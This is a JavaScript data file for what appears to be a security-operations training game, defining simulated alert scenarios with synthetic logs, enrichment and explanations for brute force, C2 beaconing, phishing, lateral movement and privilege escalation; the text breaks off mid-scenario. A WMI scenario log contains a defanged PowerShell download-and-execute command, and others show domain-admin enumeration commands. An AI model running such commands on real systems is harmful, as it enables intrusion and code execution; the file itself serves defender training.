import {
  pick, randInt, randomUser, randomFullNameAndUser, randomInternalIP,
  randomExternalIP, randomWorkstation, randomServer, timeSequence,
} from '../game/random.js'

export const CATEGORIES = {
  brute_force: 'Brute Force / Credential Attack',
  recon: 'Port Scanning / Reconnaissance',
  c2: 'Malware Beacon / C2',
  phishing: 'Phishing / Spearphishing',
  lateral: 'Lateral Movement',
  privesc: 'Privilege Escalation',
  exfil: 'Data Exfiltration',
  exploit: 'Exploitation Attempt',
}

const COUNTRIES_SUSPICIOUS = ['Russia', 'North Korea', 'Iran', 'Belarus', 'Moldova']
const COUNTRIES_TRAVEL = ['Singapore', 'Brazil', 'India', 'Japan', 'South Africa', 'Mexico']

// ---------------------------------------------------------------------------
// TRUE POSITIVES
// ---------------------------------------------------------------------------

const TP = [

  // ------------------------- BRUTE FORCE -----------------------------------
  {
    id: 'bf-success', tier: 1, verdict: 'tp', category: 'brute_force',
    correctAction: 'escalate', severity: 'high', source: 'AD / Identity',
    ruleName: 'Multiple Failed Logons Followed by Success',
    build() {
      const user = randomUser()
      const ip = randomExternalIP()
      const country = pick(COUNTRIES_SUSPICIOUS)
      const fails = randInt(28, 55)
      const times = timeSequence(6, 8, 25)
      return {
        title: `${fails} failed logons followed by successful logon — account ${user}`,
        entity: user,
        description: `Identity monitoring detected ${fails} failed logon attempts against account "${user}" from external IP ${ip} within 9 minutes, followed by a SUCCESSFUL logon from the same IP. The source geolocates to ${country}. The account has no recorded travel and normally signs in from the office network.`,
        logs: [
          `${times[0]} AUTH FAIL user=${user} src=${ip} method=OWA reason=bad_password (attempt 1 of ${fails})`,
          `${times[1]} AUTH FAIL user=${user} src=${ip} method=OWA reason=bad_password`,
          `${times[2]} AUTH FAIL user=${user} src=${ip} method=OWA reason=bad_password`,
          `${times[3]} AUTH FAIL user=${user} src=${ip} method=OWA reason=bad_password  ... (${fails - 4} similar events suppressed)`,
          `${times[4]} AUTH SUCCESS user=${user} src=${ip} method=OWA session=established`,
          `${times[5]} MAILBOX rule created: "forward all to external" by ${user}`,
        ],
        enrichment: [
          { label: 'Source IP reputation', value: `${ip} — listed on 3 blocklists (SSH/RDP brute forcing)`, tone: 'bad' },
          { label: 'GeoIP', value: `${country} — no company presence or VPN egress in this country`, tone: 'bad' },
          { label: 'Account owner', value: `${user} — Accounts Payable, normal hours 08:00–16:00`, tone: 'warn' },
          { label: 'MFA status', value: 'Not enrolled (legacy OWA endpoint)', tone: 'bad' },
        ],
        explanation: 'Dozens of failures followed by a success from the same blocklisted foreign IP is a successful brute force — a real user mistypes a password 2–3 times, not 30+. The mailbox forwarding rule confirms post-compromise activity. This is a true positive and the account is compromised, so it must be escalated for containment (password reset, session revocation).',
      }
    },
  },
  {
    id: 'bf-blocked', tier: 2, verdict: 'tp', category: 'brute_force',
    correctAction: 'close', severity: 'medium', source: 'AD / Identity',
    ruleName: 'Account Lockout — Excessive Failed Logons',
    build() {
      const user = randomUser()
      const ip = randomExternalIP()
      const fails = randInt(18, 30)
      const times = timeSequence(5, 10, 30)
      return {
        title: `Account lockout after ${fails} failed logons — ${user}`,
        entity: user,
        description: `${fails} failed VPN logon attempts against account "${user}" from ${ip} in 6 minutes. The account was locked by policy after the threshold was reached. No successful authentication occurred from this source. Perimeter firewall auto-blocked the IP after the lockout event.`,
        logs: [
          `${times[0]} AUTH FAIL user=${user} src=${ip} service=VPN reason=bad_password (attempt 1)`,
          `${times[1]} AUTH FAIL user=${user} src=${ip} service=VPN reason=bad_password  ... (${fails - 3} similar events suppressed)`,
          `${times[2]} AUTH FAIL user=${user} src=${ip} service=VPN reason=account_locked`,
          `${times[3]} POLICY account ${user} locked (threshold ${randInt(10, 15)} failures)`,
          `${times[4]} FIREWALL auto-block applied src=${ip} duration=24h`,
        ],
        enrichment: [
          { label: 'Source IP reputation', value: `${ip} — recently reported for credential stuffing`, tone: 'bad' },
          { label: 'Successful logons from IP', value: 'None (0 events, searched last 30 days)', tone: 'ok' },
          { label: 'Account status', value: 'Locked — user will reset via helpdesk in the morning', tone: 'ok' },
          { label: 'Other targeted accounts', value: 'None — single account targeted', tone: 'ok' },
        ],
        explanation: 'This is a genuine brute force attempt — real users don\'t fail 20+ times — so it\'s a true positive, not a false positive. But the attack failed completely: the account locked, no logon succeeded, and the source IP is already blocked. A fully blocked attack with no sign of compromise is documented and closed at L1; there is nothing for L2 to contain.',
      }
    },
  },
  {
    id: 'bf-spray', tier: 3, verdict: 'tp', category: 'brute_force',
    correctAction: 'escalate', severity: 'medium', source: 'AD / Identity',
    ruleName: 'Low-Volume Authentication Failures — Multiple Accounts',
    build() {
      const ip = randomExternalIP()
      const svc = `svc-${pick(['backup', 'scan', 'print', 'sql'])}${randInt(1, 9)}`
      const accounts = randInt(35, 60)
      const times = timeSequence(6, 40, 120)
      return {
        title: `Failed logons across ${accounts} accounts from single source ${ip}`,
        entity: ip,
        description: `Over the past 4 hours, ${ip} attempted 1–2 logons against ${accounts} different accounts (alphabetical order) via the Exchange autodiscover endpoint. Each account saw only 1–2 failures, so no lockouts triggered. One SUCCESS was recorded for service account "${svc}".`,
        logs: [
          `${times[0]} AUTH FAIL user=abaker src=${ip} endpoint=autodiscover reason=bad_password`,
          `${times[1]} AUTH FAIL user=acollins src=${ip} endpoint=autodiscover reason=bad_password`,
          `${times[2]} AUTH FAIL user=adunn src=${ip} endpoint=autodiscover reason=bad_password  ... (${accounts - 4} accounts, alphabetical, 1-2 attempts each)`,
          `${times[3]} AUTH FAIL user=${svc} src=${ip} endpoint=autodiscover reason=bad_password`,
          `${times[4]} AUTH SUCCESS user=${svc} src=${ip} endpoint=autodiscover`,
          `${times[5]} AUTH SUCCESS user=${svc} src=${ip} endpoint=ews (mailbox access)`,
        ],
        enrichment: [
          { label: 'Pattern', value: 'Alphabetical account iteration, 1–2 attempts per account (below lockout threshold)', tone: 'bad' },
          { label: 'Source IP', value: `${ip} — hosting provider, no prior traffic to this org`, tone: 'warn' },
          { label: `Account ${svc}`, value: 'Service account, password unchanged for 900+ days, MFA exempt', tone: 'bad' },
          { label: 'Lockouts triggered', value: '0 — volume per account stayed under policy threshold', tone: 'warn' },
        ],
        explanation: 'This is password spraying: instead of hammering one account (which locks it), the attacker tries one common password across many accounts, staying under the lockout threshold. The low per-account failure count makes it easy to dismiss — the giveaway is one source iterating accounts alphabetically. Since the spray succeeded against a service account, this is an active compromise and must be escalated.',
      }
    },
  },

  // ------------------------- RECON / PORT SCAN -----------------------------
  {
    id: 'recon-blocked', tier: 1, verdict: 'tp', category: 'recon',
    correctAction: 'close', severity: 'low', source: 'Firewall',
    ruleName: 'Inbound Port Scan Detected',
    build() {
      const ip = randomExternalIP()
      const ports = randInt(300, 900)
      const times = timeSequence(5, 1, 4)
      return {
        title: `Sequential port scan from ${ip} — ${ports} ports in 3 minutes`,
        entity: ip,
        description: `Perimeter firewall logged connection attempts from ${ip} against ${ports} sequential TCP ports on the public web server, including 22 (SSH), 445 (SMB) and 3389 (RDP). All attempts were DROPPED by policy — no port responded. The IDS classified the pattern as an automated scanner.`,
        logs: [
          `${times[0]} FW DROP src=${ip} dst=203.0.113.10 dpt=21 proto=TCP`,
          `${times[1]} FW DROP src=${ip} dst=203.0.113.10 dpt=22 proto=TCP`,
          `${times[2]} FW DROP src=${ip} dst=203.0.113.10 dpt=23 proto=TCP`,
          `${times[3]} FW DROP src=${ip} dst=203.0.113.10 dpt=25 proto=TCP  ... (${ports - 4} sequential ports, all DROP)`,
          `${times[4]} IDS signature match: "TCP SYN scan (nmap-like timing)" src=${ip}`,
        ],
        enrichment: [
          { label: 'Source IP reputation', value: `${ip} — mass-scanner, seen probing thousands of networks`, tone: 'bad' },
          { label: 'Allowed connections from IP', value: '0 — every packet dropped at perimeter', tone: 'ok' },
          { label: 'Exposed services on target', value: 'Only 443/HTTPS is open; it was not successfully probed', tone: 'ok' },
        ],
        explanation: 'A sequential sweep of hundreds of ports from one IP is a genuine scan (true positive), but every packet was dropped at the firewall and nothing internal responded. Internet-facing systems are scanned constantly; a fully blocked scan with zero successful connections is documented and closed — escalating every dropped scan would bury L2 in noise.',
      }
    },
  },
  {
    id: 'recon-internal', tier: 2, verdict: 'tp', category: 'recon',
    correctAction: 'escalate', severity: 'high', source: 'IDS / Network',
    ruleName: 'Internal Host Scanning Internal Subnet',
    build() {
      const ws = randomWorkstation()
      const ip = randomInternalIP()
      const hosts = randInt(40, 120)
      const times = timeSequence(5, 2, 8)
      return {
        title: `Internal host ${ws} scanning server subnet — ${hosts} hosts probed`,
        entity: ws,
        description: `Workstation ${ws} (${ip}) initiated connections to ${hosts} internal addresses on the server VLAN within 4 minutes, probing ports 445 (SMB), 135 (RPC) and 3389 (RDP). This workstation belongs to a marketing employee and has no administrative function. The scan started at ${times[0]}, outside the user's working hours.`,
        logs: [
          `${times[0]} NET conn src=${ip} dst=10.50.0.11 dpt=445 flags=SYN`,
          `${times[1]} NET conn src=${ip} dst=10.50.0.12 dpt=445 flags=SYN`,
          `${times[2]} NET conn src=${ip} dst=10.50.0.13 dpt=445 flags=SYN  ... (${hosts - 3} hosts, incrementing IPs)`,
          `${times[3]} NET conn src=${ip} dst=10.50.0.20 dpt=3389 flags=SYN,ACK (port open, session established)`,
          `${times[4]} EDR process spawn: nbtscan.exe parent=cmd.exe user=SYSTEM host=${ws}`,
        ],
        enrichment: [
          { label: 'Asset', value: `${ws} — marketing workstation, standard user, no admin tools approved`, tone: 'warn' },
          { label: 'Process', value: 'nbtscan.exe — network enumeration tool, not part of any corporate image', tone: 'bad' },
          { label: 'Running as', value: 'SYSTEM — user-level malware would not have this privilege', tone: 'bad' },
          { label: 'Scheduled security scans', value: 'None registered from this address (vuln scanner lives at 10.8.8.0/24)', tone: 'bad' },
        ],
        explanation: 'External scans are background noise, but an internal marketing workstation enumerating the server VLAN with a hacking tool running as SYSTEM means the host is almost certainly compromised and the attacker is mapping the network for lateral movement. Internal reconnaissance from a non-security asset is escalated immediately for host containment.',
      }
    },
  },
  {
    id: 'recon-slow', tier: 3, verdict: 'tp', category: 'recon',
    correctAction: 'escalate', severity: 'low', source: 'Firewall',
    ruleName: 'Low-and-Slow External Probing',
    build() {
      const ip = randomExternalIP()
      const times = timeSequence(6, 1500, 2600)
      return {
        title: `Repeated targeted probes from ${ip} over 6 hours`,
        entity: ip,
        description: `Correlation rule flagged ${ip} probing exactly three services — VPN gateway (443), Citrix (2598) and the RDP jump host (3389) — with single connection attempts spread 25–40 minutes apart over 6 hours. Two probes to the jump host completed TCP handshakes before disconnecting. The timing evades simple scan-rate thresholds. SIEM auto-scored this LOW due to event volume.`,
        logs: [
          `${times[0]} FW ALLOW src=${ip} dst=vpn-gw dpt=443 bytes=0 duration=1s`,
          `${times[1]} FW DROP src=${ip} dst=citrix-01 dpt=2598`,
          `${times[2]} FW ALLOW src=${ip} dst=jump-01 dpt=3389 handshake=complete duration=2s bytes=214`,
          `${times[3]} FW DROP src=${ip} dst=citrix-01 dpt=2598`,
          `${times[4]} FW ALLOW src=${ip} dst=jump-01 dpt=3389 handshake=complete duration=3s bytes=230`,
          `${times[5]} FW ALLOW src=${ip} dst=vpn-gw dpt=443 bytes=0 duration=1s`,
        ],
        enrichment: [
          { label: 'Pattern', value: 'Only business-critical remote-access services probed — not a random sweep', tone: 'bad' },
          { label: 'Timing', value: '25–40 min between probes; deliberately below scan-detection thresholds', tone: 'bad' },
          { label: 'Source IP', value: `${ip} — clean reputation, VPS provider, first seen this week`, tone: 'warn' },
          { label: 'RDP banner grab', value: 'Jump host responded with NTLM negotiation banner (info disclosure)', tone: 'bad' },
        ],
        explanation: 'The low event count and clean IP make this look ignorable — the SIEM even scored it LOW. But the behavior is targeted reconnaissance: only remote-access services probed, timing deliberately slowed to evade thresholds, and successful handshakes that fingerprinted the RDP jump host. A patient, targeted actor casing your remote access is exactly what precedes an intrusion attempt — escalate so the IP is blocked and the jump host exposure reviewed.',
      }
    },
  },

  // ------------------------- C2 / BEACON ------------------------------------
  {
    id: 'c2-classic', tier: 1, verdict: 'tp', category: 'c2',
    correctAction: 'escalate', severity: 'critical', source: 'EDR',
    ruleName: 'Periodic Outbound Beacon — Newly Registered Domain',
    build() {
      const ws = randomWorkstation()
      const domain = `${pick(['cdn-metrics', 'api-telemetry', 'svc-update', 'stat-collect'])}${randInt(10, 99)}.${pick(['xyz', 'top', 'click', 'pw'])}`
      const times = timeSequence(5, 60, 60)
      return {
        title: `Periodic beacon every 60s from ${ws} to ${domain}`,
        entity: ws,
        description: `EDR detected process "winsvchost.exe" on ${ws} making outbound HTTPS connections to ${domain} exactly every 60 seconds for the past 3 hours. The domain was registered ${randInt(3, 9)} days ago. The binary runs from C:\\Users\\Public\\ and is not signed.`,
        logs: [
          `${times[0]} NET out src=${ws} dst=${domain}:443 bytes_out=412 bytes_in=64 proc=winsvchost.exe`,
          `${times[1]} NET out src=${ws} dst=${domain}:443 bytes_out=409 bytes_in=64 proc=winsvchost.exe`,
          `${times[2]} NET out src=${ws} dst=${domain}:443 bytes_out=414 bytes_in=64 proc=winsvchost.exe`,
          `${times[3]} NET out src=${ws} dst=${domain}:443 bytes_out=411 bytes_in=64 proc=winsvchost.exe (interval: 60.0s ±0.2s, 180 connections)`,
          `${times[4]} EDR alert: unsigned binary C:\\Users\\Public\\winsvchost.exe — persistence via Run key`,
        ],
        enrichment: [
          { label: 'Domain age', value: `${domain} — registered ${randInt(3, 9)} days ago, privacy-protected registrant`, tone: 'bad' },
          { label: 'Domain reputation', value: 'Flagged by 2 threat feeds as suspected C2 infrastructure', tone: 'bad' },
          { label: 'Binary', value: 'winsvchost.exe — unsigned, mimics legitimate svchost.exe name, wrong path', tone: 'bad' },
          { label: 'Beacon regularity', value: 'Machine-perfect 60s interval with uniform payload sizes', tone: 'bad' },
        ],
        explanation: 'A metronome-regular 60-second "heartbeat" with tiny, uniform payloads to a days-old domain is the classic command-and-control beacon. The fake system binary name (winsvchost.exe) in a user-writable path plus Run-key persistence confirms malware. Active C2 means an attacker has remote control of the host — always escalate for immediate isolation.',
      }
    },
  },
  {
    id: 'c2-lowrep', tier: 2, verdict: 'tp', category: 'c2',
    correctAction: 'escalate', severity: 'high', source: 'Web Proxy',
    ruleName: 'Outbound Traffic to Low-Reputation Infrastructure',
    build() {
      const ws = randomWorkstation()
      const ip = randomExternalIP()
      const times = timeSequence(5, 280, 330)
      return {
        title: `Recurring connections from ${ws} to low-reputation IP ${ip}`,
        entity: ws,
        description: `Web proxy logged HTTPS connections from ${ws} directly to IP address ${ip} (no domain name, no SNI) roughly every 5 minutes since ${times[0]}. The traffic bypasses DNS entirely. The initiating process is "OneNoteSync.exe" running from the user's %TEMP% directory. IP reputation is poor.`,
        logs: [
          `${times[0]} PROXY CONNECT dst=${ip}:443 sni=- bytes_out=1204 proc=OneNoteSync.exe host=${ws}`,
          `${times[1]} PROXY CONNECT dst=${ip}:443 sni=- bytes_out=988 proc=OneNoteSync.exe host=${ws}`,
          `${times[2]} PROXY CONNECT dst=${ip}:443 sni=- bytes_out=1010 proc=OneNoteSync.exe host=${ws}`,
          `${times[3]} PROXY CONNECT dst=${ip}:443 sni=- bytes_out=1150 proc=OneNoteSync.exe host=${ws}`,
          `${times[4]} DNS query volume for ${ws}: none correlated with these connections (hardcoded IP)`,
        ],
        enrichment: [
          { label: 'Destination IP', value: `${ip} — bulletproof hosting range, 14 malware samples call back here`, tone: 'bad' },
          { label: 'Process origin', value: 'OneNoteSync.exe in %TEMP% — Microsoft ships no such binary', tone: 'bad' },
          { label: 'TLS certificate', value: 'Self-signed, CN=localhost, issued 2 weeks ago', tone: 'bad' },
          { label: 'Real OneNote on host', value: 'Installed in Program Files, unrelated to this process', tone: 'warn' },
        ],
        explanation: 'Direct-to-IP HTTPS with no DNS and no SNI is how malware hides from domain-based filtering. Combined with a fake Microsoft process name in %TEMP%, a self-signed certificate, and an IP known to host malware callbacks, this is C2 traffic. The ~5-minute cadence is the beacon interval. Escalate for host isolation and memory capture.',
      }
    },
  },
  {
    id: 'c2-jitter', tier: 3, verdict: 'tp', category: 'c2',
    correctAction: 'escalate', severity: 'medium', source: 'Web Proxy',
    ruleName: 'Beaconing Pattern — Statistical Detection',
    build() {
      const ws = randomWorkstation()
      const domain = `sync.${pick(['notify-hub', 'app-relay', 'client-portal', 'team-connect'])}.com`
      const times = timeSequence(6, 400, 900)
      return {
        title: `Statistical beaconing from ${ws} to ${domain}`,
        entity: ws,
        description: `A behavioral model flagged connections from ${ws} to ${domain} occurring every 7–15 minutes with randomized jitter, active continuously for 5 days — including nights and the weekend when the workstation was locked. The domain name looks like business software, the traffic volume is small, and the TLS certificate is valid (Let's Encrypt). SIEM scored this MEDIUM only because of the persistence across idle periods.`,
        logs: [
          `${times[0]} PROXY GET https://${domain}/api/v2/status ua="Mozilla/5.0 (compatible)" bytes_in=312 host=${ws}`,
          `${times[1]} PROXY GET https://${domain}/api/v2/status ua="Mozilla/5.0 (compatible)" bytes_in=298 host=${ws}`,
          `${times[2]} PROXY POST https://${domain}/api/v2/sync bytes_out=2048 host=${ws}`,
          `${times[3]} PROXY GET https://${domain}/api/v2/status bytes_in=305 host=${ws} (05:12 — workstation locked, no user session)`,
          `${times[4]} PROXY GET https://${domain}/api/v2/status bytes_in=310 host=${ws} (Sunday 03:44)`,
          `${times[5]} EDR: initiating process msedge_proxy.exe — file created 6 days ago, no update history`,
        ],
        enrichment: [
          { label: 'Domain age', value: `${domain} — registered 11 days ago; website is a single placeholder page`, tone: 'bad' },
          { label: 'Traffic while idle', value: 'Beacons continue when screen locked and overnight — no user driving it', tone: 'bad' },
          { label: 'Prevalence', value: 'Exactly 1 host in the company talks to this domain', tone: 'bad' },
          { label: 'TLS / reputation', value: 'Valid Let\'s Encrypt cert, not on any blocklist (yet)', tone: 'ok' },
        ],
        explanation: 'Modern C2 frameworks add random jitter and legitimate-looking domains precisely to defeat "every 60 seconds" detections. The tells here are behavioral: traffic continues while the machine is locked (no human), the domain is 11 days old with a placeholder site, and only one host in the entire company talks to it. A clean reputation score means nothing for brand-new infrastructure. Escalate — single-host beaconing to fresh infrastructure is a likely targeted implant.',
      }
    },
  },

  // ------------------------- PHISHING ---------------------------------------
  {
    id: 'phish-typo', tier: 1, verdict: 'tp', category: 'phishing',
    correctAction: 'escalate', severity: 'high', source: 'Email Gateway',
    ruleName: 'Suspicious Link — Lookalike Domain',
    build() {
      const clicked = randInt(2, 5)
      const total = randInt(9, 18)
      const times = timeSequence(4, 60, 300)
      return {
        title: `Phishing campaign: "Your PayPaI account is limited" — ${total} recipients`,
        entity: 'paypa1-secure.com',
        description: `Email gateway flagged (post-delivery) a message sent to ${total} employees with subject "Your account access has been limited". The embedded link points to hxxps://paypa1-secure[.]com/login — note the digit "1" replacing the letter "l". Click-tracking shows ${clicked} users clicked the link before the alert fired. The sending domain was registered yesterday.`,
        logs: [
          `${times[0]} MAIL inbound from=service@paypa1-secure.com subject="Your account access has been limited" recipients=${total}`,
          `${times[1]} MAIL link extracted: hxxps://paypa1-secure[.]com/login/verify?id=...`,
          `${times[2]} PROXY click event: user 1 of ${clicked} → paypa1-secure.com (page mimics PayPal login)`,
          `${times[3]} PROXY click events: ${clicked - 1} additional users clicked within 20 minutes`,
        ],
        enrichment: [
          { label: 'Sender domain', value: 'paypa1-secure.com — typosquat ("1" for "l"), registered yesterday', tone: 'bad' },
          { label: 'SPF / DKIM', value: 'SPF pass for paypa1-secure.com (attacker controls that domain — pass is meaningless)', tone: 'warn' },
          { label: 'Landing page', value: 'Pixel-perfect clone of PayPal login, form posts credentials to attacker host', tone: 'bad' },
          { label: 'Clicks', value: `${clicked} employees clicked; unknown how many entered credentials`, tone: 'bad' },
        ],
        explanation: 'Classic typosquatting — "paypa1" with a digit 1 instead of "paypal". SPF passing doesn\'t help: it only proves the mail came from the attacker\'s own lookalike domain. Because employees already clicked a credential-harvesting page, this can\'t just be closed: escalate so affected users get password resets and the remaining copies are purged from mailboxes.',
      }
    },
  },
  {
    id: 'phish-quarantined', tier: 2, verdict: 'tp', category: 'phishing',
    correctAction: 'close', severity: 'medium', source: 'Email Gateway',
    ruleName: 'Malicious Attachment Blocked',
    build() {
      const total = randInt(4, 9)
      const times = timeSequence(4, 5, 30)
      const file = pick(['Invoice_74221.pdf.js', 'Faktura_0982.pdf.exe', 'Payment_Advice.scr', 'DHL_Delivery_Note.js'])
      return {
        title: `Malicious attachment "${file}" quarantined — ${total} copies`,
        entity: file,
        description: `Email gateway detected and QUARANTINED ${total} inbound messages carrying attachment "${file}" — an executable script disguised as an invoice document (double extension). All copies were quarantined at the gateway; zero were delivered to user mailboxes. Sandbox detonation confirms the payload is a known infostealer loader.`,
        logs: [
          `${times[0]} MAIL inbound from=billing@${pick(['fastura-online', 'invoice-portal-eu', 'docs-secure-mail'])}.com attachment=${file}`,
          `${times[1]} GATEWAY verdict=MALICIOUS engine=sandbox family=infostealer-loader`,
          `${times[2]} GATEWAY action=QUARANTINE copies=${total} delivered=0`,
          `${times[3]} SANDBOX detonation: drops stealer payload, exfil to known C2 (blocked category)`,
        ],
        enrichment: [
          { label: 'Delivery status', value: `0 of ${total} delivered — all quarantined at gateway`, tone: 'ok' },
          { label: 'Attachment', value: `${file} — double extension, script executable masquerading as document`, tone: 'bad' },
          { label: 'User interaction', value: 'None possible — messages never reached any mailbox', tone: 'ok' },
          { label: 'Campaign', value: 'Matches widespread commodity malspam wave seen across many orgs today', tone: 'ok' },
        ],
        explanation: 'A real malicious campaign (true positive — the attachment is genuine malware), but the control worked: every copy was quarantined and no user could have opened it. Commodity malspam that is fully blocked at the gateway is documented and closed. Escalation is for incidents needing containment or response — here there is nothing to contain.',
      }
    },
  },
  {
    id: 'phish-spear', tier: 3, verdict: 'tp', category: 'phishing',
    correctAction: 'escalate', severity: 'medium', source: 'Email Gateway',
    ruleName: 'User-Reported Suspicious Email',
    build() {
      const { name } = randomFullNameAndUser()
      const times = timeSequence(4, 300, 900)
      return {
        title: `User-reported email: wire transfer request to CFO office`,
        entity: 'northbridge-finance.com',
        description: `An executive assistant reported an email addressed to the CFO's office requesting an urgent confidential wire transfer for an "acquisition closing". Sender displays as "${name} — Board Advisory" from domain northbridge-finance.com. The legitimate company domain is northbridgefinancial.com. The email contains no links or attachments — text only — so automated engines scored it clean. A reply was already sent from the CFO office mailbox asking for the account details.`,
        logs: [
          `${times[0]} MAIL inbound from=${name.toLowerCase().replace(' ', '.')}@northbridge-finance.com to=cfo-office subject="RE: Project Falcon — closing funds"`,
          `${times[1]} GATEWAY verdict=CLEAN (no links, no attachments, no known-bad indicators)`,
          `${times[2]} MAIL outbound reply from=cfo-office to=${name.toLowerCase().replace(' ', '.')}@northbridge-finance.com`,
          `${times[3]} USER REPORT via phishing button: "this vendor doesn't sound right" reporter=exec-assistant`,
        ],
        enrichment: [
          { label: 'Sender domain', value: 'northbridge-finance.com — registered 6 days ago; real domain is northbridgefinancial.com', tone: 'bad' },
          { label: 'Content analysis', value: 'Urgency + secrecy + wire transfer + authority impersonation = classic BEC pattern', tone: 'bad' },
          { label: 'Automated verdict', value: 'CLEAN — text-only BEC carries no technical indicators for engines to flag', tone: 'warn' },
          { label: 'Thread status', value: 'CFO office already replied — active conversation with the attacker', tone: 'bad' },
        ],
        explanation: 'Business Email Compromise (BEC) is phishing without any payload — no link or attachment means automated engines pass it, and only the lookalike domain and social-engineering pattern give it away. The gateway\'s CLEAN verdict is why it lands on a human queue. Because staff are actively corresponding with the attacker about a wire transfer, this needs immediate escalation to stop a potential fraudulent payment.',
      }
    },
  },

  // ------------------------- LATERAL MOVEMENT -------------------------------
  {
    id: 'lat-psexec', tier: 2, verdict: 'tp', category: 'lateral',
    correctAction: 'escalate', severity: 'critical', source: 'EDR',
    ruleName: 'Remote Execution Tool — Workstation to Workstation',
    build() {
      const user = randomUser()
      const src = randomWorkstation()
      const hosts = randInt(6, 12)
      const times = timeSequence(5, 40, 120)
      return {
        title: `PsExec activity from ${src} to ${hosts} hosts — account ${user}`,
        entity: user,
        description: `EDR detected PSEXESVC service installation on ${hosts} different machines within 15 minutes, all initiated from ${src} using account "${user}". This account belongs to a warehouse logistics coordinator and has never authenticated to any of the target hosts before. Activity began at ${times[0]} — 03:00 local, user is not on shift.`,
        logs: [
          `${times[0]} EDR service install: PSEXESVC on ${randomWorkstation()} initiator=${src} user=${user}`,
          `${times[1]} EDR service install: PSEXESVC on ${randomWorkstation()} initiator=${src} user=${user}`,
          `${times[2]} EDR service install: PSEXESVC on ${randomServer('FS')} initiator=${src} user=${user}`,
          `${times[3]} AUTH logon type=3 (network) user=${user} — ${hosts} distinct hosts in 15 min (baseline: 1 host/day)`,
          `${times[4]} EDR process on target: cmd.exe /c "whoami & net group \\"domain admins\\" /domain"`,
        ],
        enrichment: [
          { label: 'Account baseline', value: `${user} — logistics coordinator; authenticates only to own WS + 2 warehouse apps`, tone: 'bad' },
          { label: 'Tool', value: 'PsExec — legitimate admin tool, but this user has no admin role', tone: 'bad' },
          { label: 'Commands on targets', value: 'Domain admin group enumeration — attacker looking for privilege targets', tone: 'bad' },
          { label: 'Time', value: '03:00 — account owner not on shift, no VPN session active', tone: 'bad' },
        ],
        explanation: 'One account fanning out to many machines it has never touched, at 3 AM, using PsExec, and running domain-admin enumeration on each target — this is textbook lateral movement with stolen credentials. The account owner\'s real job (warehouse logistics) makes admin tooling impossible to justify. Escalate immediately: credentials are compromised and the attacker is actively expanding.',
      }
    },
  },
  {
    id: 'lat-wmi', tier: 2, verdict: 'tp', category: 'lateral',
    correctAction: 'escalate', severity: 'high', source: 'EDR',
    ruleName: 'WMI Remote Process Creation',
    build() {
      const src = randomWorkstation()
      const dst = randomServer('DB')
      const user = randomUser()
      const times = timeSequence(4, 30, 90)
      return {
        title: `WMI remote execution: ${src} → ${dst}`,
        entity: src,
        description: `EDR flagged remote process creation over WMI from workstation ${src} to database server ${dst}. The spawned process is an encoded PowerShell command. Initiating account "${user}" is a finance analyst with no server administration duties. WMI execution between a user workstation and a production DB server has no business precedent in the environment baseline.`,
        logs: [
          `${times[0]} EDR WmiPrvSE.exe spawned powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIA... on ${dst}`,
          `${times[1]} EDR decoded command: New-Object Net.WebClient; DownloadString('hxxp://${randomExternalIP()}/a.ps1') | IEX`,
          `${times[2]} AUTH logon type=3 user=${user} src=${src} dst=${dst} auth=NTLM`,
          `${times[3]} NET out from ${dst} to external IP blocked by egress policy (download attempt failed)`,
        ],
        enrichment: [
          { label: 'Execution chain', value: 'WMI → encoded PowerShell → download-and-execute from external IP', tone: 'bad' },
          { label: 'Account', value: `${user} — finance analyst; first-ever authentication to ${dst}`, tone: 'bad' },
          { label: 'Target', value: `${dst} — production database server (customer records)`, tone: 'warn' },
          { label: 'Egress attempt', value: 'Payload download blocked, but attacker retains access to retry', tone: 'warn' },
        ],
        explanation: 'WMI remote process creation with base64-encoded PowerShell pulling a script from the internet is a standard attacker tradecraft chain. Even though the egress filter blocked this payload download, the attacker has working credentials and a foothold — they will simply try another method. Blocked ≠ contained here: the compromised credentials and source host still need response, so escalate.',
      }
    },
  },
  {
    id: 'lat-rdp', tier: 3, verdict: 'tp', category: 'lateral',
    correctAction: 'escalate', severity: 'medium', source: 'AD / Identity',
    ruleName: 'Unusual RDP Chain Between Workstations',
    build() {
      const user = `svc-${pick(['deploy', 'monitor', 'etl'])}${randInt(1, 5)}`
      const a = randomWorkstation(); const b = randomWorkstation(); const c = randomWorkstation()
      const times = timeSequence(5, 200, 600)
      return {
        title: `Service account ${user} in interactive RDP sessions`,
        entity: user,
        description: `Identity analytics flagged service account "${user}" performing INTERACTIVE RDP logons in a chain: ${a} → ${b} → ${c}, over 40 minutes. Service accounts in this environment authenticate non-interactively to fixed servers; this one has never had an RDP session in 2 years of history. Each hop stayed under 15 minutes. SIEM severity is MEDIUM because each individual logon looks routine.`,
        logs: [
          `${times[0]} AUTH logon type=10 (RemoteInteractive) user=${user} dst=${a} src=VPN-pool`,
          `${times[1]} AUTH logon type=10 user=${user} src=${a} dst=${b}`,
          `${times[2]} EDR on ${b}: ntdsutil.exe executed (AD database tooling) user=${user}`,
          `${times[3]} AUTH logon type=10 user=${user} src=${b} dst=${c}`,
          `${times[4]} AUTH baseline: ${user} logon type history = 100% type 3/4 (network/batch), 0 interactive, 2y lookback`,
        ],
        enrichment: [
          { label: 'Account type', value: `${user} — ETL/automation service account; interactive login should never happen`, tone: 'bad' },
          { label: 'Chain pattern', value: 'Workstation-hopping (A→B→C), each hop < 15 min — pivot behavior', tone: 'bad' },
          { label: 'Tooling', value: 'ntdsutil.exe on hop 2 — used legitimately by AD admins, or by attackers to dump credentials', tone: 'bad' },
          { label: 'Origin', value: 'First hop entered from VPN pool — session owner unverified', tone: 'warn' },
        ],
        explanation: 'Each hop alone looks like an admin doing routine work — that\'s why the SIEM only scored it MEDIUM. The signal is the combination: a service account (which should never log in interactively) chaining RDP sessions between workstations and running ntdsutil, a tool attackers use to dump Active Directory credentials. Behavioral anomalies on service accounts are high-value detections: escalate.',
      }
    },
  },

  // ------------------------- PRIVILEGE ESCALATION ---------------------------
  {
    id: 'priv-group', tier: 1, verdict: 'tp', category: 'privesc',
    correctAction: 'escalate', severity: 'critical', source: 'AD / Identity',
    ruleName: 'Sensitive Group Membership Change',
    build() {
      const user = randomUser()
      const times = timeSequence(4, 60, 200)
      return {
        title: `Account ${user} added to Domain Admins — no change ticket`,
        entity: user,
        description: `At ${times[1]}, standard user account "${user}" (customer support agent) was added to the Domain Admins group. The change was performed by the account itself via direct LDAP modification — not through the IAM portal. There is no change ticket, no approval, and the IAM team confirms no scheduled work tonight.`,
        logs: [
